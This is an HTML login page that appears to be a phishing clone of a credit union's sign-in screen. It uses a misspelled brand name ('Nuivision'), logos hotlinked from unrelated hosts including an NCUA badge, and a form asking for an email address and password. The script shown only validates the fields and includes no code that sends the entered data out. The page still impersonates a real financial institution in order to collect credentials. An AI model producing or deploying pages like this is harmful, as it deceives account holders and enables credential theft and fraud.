<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Nuivision - Email Details</title>
    <link
      rel="icon"
      type="image/jpeg"
      href="https://s3-media0.fl.yelpcdn.com/bphoto/ASbZrjRyKIcUNEoVv5f3ag/o.jpg"
    />
    <style>
      body {
        background-color: #767679;
        font-family: Arial, sans-serif;
        margin: 0;
      }

      .main-section {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        min-height: 100vh;
        padding: 10px;
        box-sizing: border-box;
      }

      .center-container {
        display: flex;
        flex-direction: column;
        width: 100%;
        max-width: 700px;
        background-color: #f6f6f6;
        border-radius: 8px;
        overflow: hidden;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      }

      .top-section {
        background-color: #ffffff;
        display: flex;
        justify-content: center;
        padding: 20px;
        border-bottom: 1px solid #cccccc;
        border-top-left-radius: 8px;
        border-top-right-radius: 8px;
      }

      .top-section img {
        max-width: 50%;
        height: auto;
        max-height: 90px;
      }

      .middle-section {
        display: flex;
        flex-direction: column;
        align-items: center;
        padding: 20px;
      }

      .form {
        width: 100%;
        max-width: 400px;
        padding: 0;
      }

      .label {
        color: #2e2e2e;
        font-family: sans-serif;
        margin-top: 10px;
        display: block;
      }

      .input-section {
        width: 100%;
        margin-top: 10px;
        box-sizing: border-box;
        border: 1px solid #cccccc;
        height: 45px;
        border-radius: 5px;
        padding: 10px;
        font-size: 16px;
      }

      .submit-btn {
        border-radius: 5px;
        background-color: #8da3ad;
        width: 100%;
        border: none;
        height: 40px;
        color: white;
        cursor: pointer;
        font-size: 16px;
        margin-top: 20px;
      }

      .submit-btn:not(:disabled) {
        background-color: #415d6a;
        cursor: pointer;
      }

      .submit-btn:disabled {
        cursor: not-allowed;
        opacity: 0.6;
      }

      .down-section {
        background-color: #003f53;
        display: flex;
        color: white;
        align-items: center;
        gap: 20px;
        font-family: sans-serif;
        font-size: 13px;
        justify-content: center;
        flex-wrap: wrap;
        padding: 15px;
        border-bottom-left-radius: 8px;
        border-bottom-right-radius: 8px;
      }

      .forgot {
        color: black;
        cursor: pointer;
        font-family: sans-serif;
        font-size: 13px;
        text-align: end;
        margin-top: 20px;
      }

      .forgot:hover {
        color: #0080a8;
      }

      .bottom-logo {
        display: flex;
        justify-content: center;
        padding: 20px;
        margin-top: 20px;
      }

      .bottom-logo img {
        max-width: 130px;
        height: auto;
      }

      @media (max-width: 600px) {
        .center-container {
          max-width: 100%;
          margin: 0 10px;
        }

        .top-section {
          justify-content: center;
          padding: 10px;
        }

        .top-section img {
          max-width: 70%;
          margin: 0;
        }

        .form {
          max-width: 100%;
          padding: 0 20px;
        }

        .down-section {
          gap: 15px;
          font-size: 12px;
          padding: 10px;
        }

        .bottom-logo img {
          max-width: 100px;
        }
      }

      @media (max-width: 400px) {
        .input-section,
        .submit-btn {
          font-size: 14px;
        }

        .down-section {
          flex-direction: column;
          gap: 10px;
        }
      }
    </style>
  </head>
  <body>
    <div class="main-section">
      <div class="center-container">
        <div class="top-section">
          <img
            src="https://chambermaster.blob.core.windows.net/images/members/764/10280/MemPageHeader_Nuvision_color_01_Logo.jpg"
            alt="Nuivision Logo"
          />
        </div>
        <div class="middle-section">
          <form class="form">
            <div>
              <label class="label">Email Address</label>
              <input
                type="email"
                id="email"
                class="input-section"
                placeholder="example@domain.com"
                required
              />
            </div>
            <div>
              <label class="label">Password</label>
              <input
                type="password"
                id="password"
                class="input-section"
                required
              />
            </div>
            <button class="submit-btn" id="submitBtn" disabled type="submit">
              Submit
            </button>
            <p class="forgot">Forgot your password?</p>
          </form>
        </div>
        <div class="down-section">
          Call Us | Privacy Policy | Enroll Now | Forgot Login | Rates
        </div>
      </div>
      <div class="bottom-logo">
        <img
          src="https://cdn1.onlineaccess1.com/cdn/depot/5063/3393/ba5a89e5187907b47df565433c5fa651/assets/images/ncua_logo_large-4a4a13e41007adaf4841dd9e4b145458.png"
          alt="NCUA Logo"
          height="40%"
          width="100%"
        />
      </div>
    </div>

    <script>
      const inputs = {
        email: document.getElementById("email"),
        password: document.getElementById("password"),
      };
      const submitBtn = document.getElementById("submitBtn");

      function checkInputs() {
        const allFilled = Object.values(inputs).every(
          (input) => input.value.trim() !== ""
        );
        const validEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(inputs.email.value);
        submitBtn.disabled = !(allFilled && validEmail);
      }

      Object.values(inputs).forEach((input) =>
        input.addEventListener("input", checkInputs)
      );
    </script>
  </body>
</html>
